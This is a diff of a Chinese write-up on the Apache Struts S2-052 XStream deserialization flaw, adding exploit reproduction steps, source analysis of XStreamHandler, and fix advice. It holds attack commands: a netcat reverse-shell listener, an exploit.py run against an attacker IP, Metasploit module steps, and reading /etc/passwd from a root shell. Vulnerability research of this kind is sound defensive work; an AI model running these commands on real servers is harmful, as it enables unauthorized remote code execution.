@@ -92,13 +92,76 @@ nc -l -p 8001
 
 如图，我们获取了一个root身份的shell，通过shell我们可以执行任意指令(如图`cat /etc/passwd`). 至此漏洞攻击复现完毕。
 
+### 运行python脚本实现攻击
+
+编写好了一个[python脚本](./exploit.py)以供更便捷地复现攻击过程
+
+``` bash
+nc -l -p 8001
+# Use: python exploit.py <attacker ip> <attacker port>
+python exploit.py 10.30.178.227 8001
+```
+
+## 使用Metasploit模块进行攻击
+
+``` bash
+msf > use exploit/multi/http/struts2_rest_xstream
+msf exploit(struts2_rest_xstream) > show targets
+    ...targets...
+msf exploit(struts2_rest_xstream) > set TARGET <target-id>
+msf exploit(struts2_rest_xstream) > show options
+    ...show and set options...
+msf exploit(struts2_rest_xstream) > exploit
+```
+
 ## 0x04 漏洞分析
 
-漏洞分析部分包括`代码审计`部分以及`补丁分析`部分。
+从`Apache Struts`的一个镜像站点下载`Apache Struts 2.5.12`的源码包进行分析: [struts-2.5.12-src.zip](https://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-src.zip)
 
-针对Java反序列化漏洞进行探究，明确漏洞原理，漏洞危害等。同时分析Apache Sturts 2.5.13及以上版本中对于该漏洞代码的补丁。
+在`struts-plugins.xml`中的`bean`标签根据`Content-Type`进行分类，并对各类唯一指定了一个`Handler`.
 
-### 漏洞代码
+``` xml
+<!-- filepath: /src/plugins/rest/src/main/resources/struts-plugin.xml -->
+<bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="xml" class="org.apache.struts2.rest.handler.XStreamHandler" />
+```
+
+`ContentTypeHandler`将对应类型的请求数据分配给指定的子类进行处理，针对`xml`则是指定用`XStreamHandler`进行处理。我们查看源码分析它是如何进行处理的
+
+``` java
+// filepath: src/plugins/rest/src/main/java/org/apache/struts2/rest/handler/XStreamHandler.java
+
+public class XStreamHandler implements ContentTypeHandler {
+
+    public String fromObject(Object obj, String resultCode, Writer out) throws IOException {
+        if (obj != null) {
+            XStream xstream = createXStream();
+            xstream.toXML(obj, out);
+        }
+        return null;
+    }
+
+    public void toObject(Reader in, Object target) {
+        XStream xstream = createXStream();
+        xstream.fromXML(in, target);
+    }
+    
+    protected XStream createXStream() {
+        return new XStream();
+    }
+
+    public String getContentType() {
+        return "application/xml";
+    }
+
+    public String getExtension() {
+        return "xml";
+    }
+}
+```
+
+可见，在`marshal`和`unmarshal`过程中，`XStreamHandler`未能对请求的XML数据进行校验和检查，可能导致Java反序列化漏洞
+
+再看`ContentTypeInterceptor.java`，代码首先使用`getHandlerForRequest`方法(Gets the handler for the request by looking at the request content type and extension)对请求的xml获取`XStreamHandler`
 
 ``` java
 // filepath: src/plugins/rest/src/main/java/org/apache/struts2/rest/ContentTypeInterceptor.java
@@ -119,6 +182,7 @@ public String intercept(ActionInvocation invocation) throws Exception {
     return invocation.invoke();
 }
 ```
+
 其中的关键漏洞代码在以下：
 ``` java
 InputStream is = request.getInputStream();
@@ -126,36 +190,38 @@ InputStreamReader reader = new InputStreamReader(is);
 handler.toObject(reader, target);
 ```
 
-## 0x05 漏洞修复情况
+这里未有对请求数据进行校验和检查，导致了`XStreamHandler`在反序列化传入的xml时造成了远程代码执行。
 
-新版本中增加了`XStreamPermissionProvider`，并且对原先有问题的`createXStream`进行重写，增加了校验，拒绝不安全的类执行
+至于如何构造XML数据导致命令执行，详情查看这篇论文: [marshalsec.pdf](https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf)
+
+我们可以使用论文作者开源的`marshalsec`工具来生成payload。
+
+## 0x05 补丁分析
+
+从`Apache Struts`的一个镜像站点下载`Apache Struts 2.5.13`的源码包进行分析: [struts-2.5.13-src.zip](https://archive.apache.org/dist/struts/2.5.13/struts-2.5.13-src.zip),同时结合官方发布补丁的commit记录进行分析： [链接](https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264)
+
+> Todo: 编写补丁分析部分
+
+* 设置插件处理的数据类型限定为json(缓解无效)
+
+    ```java
+    <constant name="struts.action.extension" value="xhtml,,json" />
+    ```
 
 ## 0x06 Struts 2过往漏洞情况
 
 Apache Struts 2漏洞频发，过往有大量的该产品的漏洞预警。安全分析人士甚至编写有Struts2全漏洞检测脚本。通过对往期Struts2漏洞，分析Struts2常见的攻击方式并总结Struts2的一些修复建议。
 
+> Todo: 搜集过往的一些漏洞情况
+
 ## 0x07 S2-052 修复建议
 
+在新版本中增加了`XStreamPermissionProvider`，并且对原先有问题的`createXStream`进行重写，增加了校验，拒绝不安全的类执行
+
 * 升级至`Struts 2.5.13`或`Struts 2.3.34`版本
-* 在不使用时移除移除`Struts REST`插件
-* 限制REST插件仅处理服务器正常页面和JSON文件
-    1. 禁用XML页面处理并限定为以下页面
-    ```java
-    <constant name="struts.action.extension" value="xhtml,,json" />
-    ```
-    2. 重载`XStreamHandler`里的`getContentType`方法
-    ``` java
-    public class MyXStreamHandler extends XStreamHandler { public String getContentType() {
-        return "not-existing-content-type-@;/&%$#@";
-        }
-    }
-    ```    
-    3. 通过重载struts.xml里的框架来注册处理程序
-    ```java
-    <bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="myXStreamHandmer" class="com.company.MyXStreamHandler"/>
-    <constant name="struts.rest.handlerOverride.xml" value="myXStreamHandler"/>
-    ```
 * 在XStreamHandler中进行数据校验或检查
+* 在不使用时移除移除`Struts REST`插件
+
 
 ## 0xEE 人员分工
 
